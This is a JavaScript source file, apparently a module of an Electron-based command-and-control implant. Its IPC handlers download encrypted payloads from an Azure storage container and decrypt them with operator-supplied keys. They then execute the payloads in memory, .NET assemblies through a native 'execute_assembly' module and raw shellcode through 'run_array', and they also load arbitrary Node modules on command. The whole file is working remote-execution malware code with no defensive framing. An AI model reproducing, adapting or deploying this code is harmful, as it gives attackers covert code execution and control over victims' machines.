const config = require('./config.js');
const storageAccount = config.storageAccount;
const sasToken       = config.sasToken;
const { ipcRenderer } = require('electron');
const { log } = require('console');
const {func_Decrypt} = require('./crypt.js');
const {func_Split_Quoted_String} = require('./common.js');
let dbg = true;

function func_log(text)
{
  if(dbg)
  {
    log(text);
  }
}
  
ipcRenderer.on('assembly', async (event, container, args, scexecblob, key,iv) => {
    try
    {
        func_log(`assembly.js | Hit IPC do-assembly | ${container} ${scexecblob}`);
        let assemblyoutput = await func_Azure_Assembly_Download_Exec(container,scexecblob,key,iv,args);
        ipcRenderer.send('end-file-op','do-assembly',assemblyoutput,key,iv);
    }catch(error)
    {
        func_log(`Error in IPC do-assembly : ${error} ${error.stack}`);
    }
});
async function func_Azure_Assembly_Download_Exec(containerName, scexecblob, key,iv,args) 
{
  // Construct the URL
  let output = "";
  const sasUrl = `https://${storageAccount}/${containerName}/${scexecblob}?${sasToken}`;
  func_log(`assembly.js | func_Azure_Assembly_Download_Exec | key : ${key} | iv : ${iv}`);
  key = Buffer.from(key, 'hex');
  iv  = Buffer.from(iv,  'hex');

  let response = await fetch(sasUrl);
  if (!response.ok) {
    output = `Couldn't download file, response: ${response.status}`;
    func_log( output );
  }else
  {
    func_log(`response.ok : ${response.ok}`);
    let arrayBuffer = await response.arrayBuffer();
    buffer          = Buffer.from(arrayBuffer);
    raw             = await func_Decrypt( buffer, key, iv );
    let assemblyNodePath = await ipcRenderer.invoke('get-global-path', 'assemblyNodePath');
    let x = require(assemblyNodePath);
    const argv = await func_Split_Quoted_String(args);
    let aoutput = x.execute_assembly(raw, argv);
    return aoutput;
  }
}
ipcRenderer.on('nodeload', async (event,nodepath) => {
    try
    {
        func_log(`assembly.js | Hit IPC do-node-load`);
        require(nodepath);
    }catch(error)
    {
        func_log(`Error in IPC do-node-load : ${error}`);
    }
});
ipcRenderer.on('scexec', async (event, container, scexecblob, key,iv) => {
    try
    {
        func_log(`assembly.js | Hit IPC do-scexec | ${container} ${scexecblob}`);
        await func_Azure_File_Download_Exec(container,scexecblob,key,iv);
        ipcRenderer.send('end-file-op','do-scexec','executed',key,iv);
    }catch(error)
    {
        func_log(`Error in IPC do-scexec : ${error}`);
    }
});
async function func_Azure_File_Download_Exec(containerName, scexecblob, key,iv) 
{
  // Construct the URL
  let output = "";
  const sasUrl = `https://${storageAccount}/${containerName}/${scexecblob}?${sasToken}`;
  func_log(`assembly.js | func_Azure_File_Download_Exec | key : ${key} | iv : ${iv}`);
  key = Buffer.from(key, 'hex');
  iv  = Buffer.from(iv,  'hex');

  let response = await fetch(sasUrl);
  if (!response.ok) {
    output = `Couldn't download file, response: ${response.status}`;
    func_log( output );
    return output;
  }else
  {
    func_log(`response.ok : ${response.ok}`);
    let arrayBuffer = await response.arrayBuffer();
    buffer          = Buffer.from(arrayBuffer);
    raw             = await func_Decrypt( buffer, key, iv );
    let scexecNodePath = await ipcRenderer.invoke('get-global-path', 'scexecNodePath');
    func_log(`scexecNodePath : ${scexecNodePath}`);
    const native = require(scexecNodePath);
    func_log(`func_Azure_File_Download_Exec result : ${native.run_array(Array.from(raw))}`);
  }
}
